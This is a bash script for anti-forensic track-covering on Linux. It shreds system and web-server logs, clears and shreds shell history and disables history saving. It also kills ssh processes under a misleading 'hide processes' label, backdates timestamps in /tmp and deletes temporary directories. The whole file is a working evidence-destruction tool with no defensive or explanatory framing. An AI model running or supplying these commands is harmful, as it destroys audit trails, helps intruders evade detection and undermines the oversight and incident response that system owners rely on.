#!/bin/bash
# Delete common logs on Linux-based systems

log_paths=(
  "/var/log/auth.log"
  "/var/log/syslog"
  "/var/log/messages"
  "/var/log/apache2/access.log"
  "/var/log/apache2/error.log"
)

echo "[*] Deleting common logs..."
for path in "${log_paths[@]}"; do
  if [ -f "$path" ]; then
    echo "Deleting $path ..."
    shred -u -z "$path"
  fi
done


# 2. Remove commands from user history

echo "[*] Clearing command history..."
history -c
shred -u -z ~/.bash_history
unset HISTFILE


# 3. Hide processes

echo "[*] Hiding running processes..."
# Hide ssh or other related processes
pkill -f "ssh"


# 4. Modify timestamps of files

echo "[*] Modifying timestamps of files..."
find /tmp -type f -exec touch -t 202201010101 {} \;


# 5. Delete temporary files

echo "[*] Deleting temporary files..."
rm -rf /tmp/*
rm -rf /var/tmp/*
